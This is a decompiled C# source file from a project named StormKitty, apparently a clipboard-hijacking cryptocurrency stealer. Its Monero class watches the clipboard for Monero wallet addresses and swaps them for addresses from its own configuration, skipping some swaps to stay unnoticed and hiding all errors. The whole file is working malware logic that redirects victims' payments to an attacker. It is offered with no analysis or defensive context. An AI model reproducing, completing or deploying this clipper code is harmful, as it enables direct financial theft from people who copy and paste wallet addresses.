using System;
using System.Linq;
using System.Windows.Forms;

namespace StormKitty
{
	// Token: 0x02000048 RID: 72
	internal class Monero
	{
		// Token: 0x0600012E RID: 302 RVA: 0x00009B68 File Offset: 0x00007D68
		public static void GetMoneroWhile()
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					string text = Clipboard.GetText();
					if (!Config.walletsxmr.Contains(text) && CheckXMR.Clipregex(text))
					{
						if (Monero._oppToMiss > 0)
						{
							Monero._oppToMiss--;
						}
						else
						{
							Monero._oppToMiss = Config.OppToMissDef;
							CheckXMR.SetsXMR(text);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000088 RID: 136
		public static int _oppToMiss;
	}
}
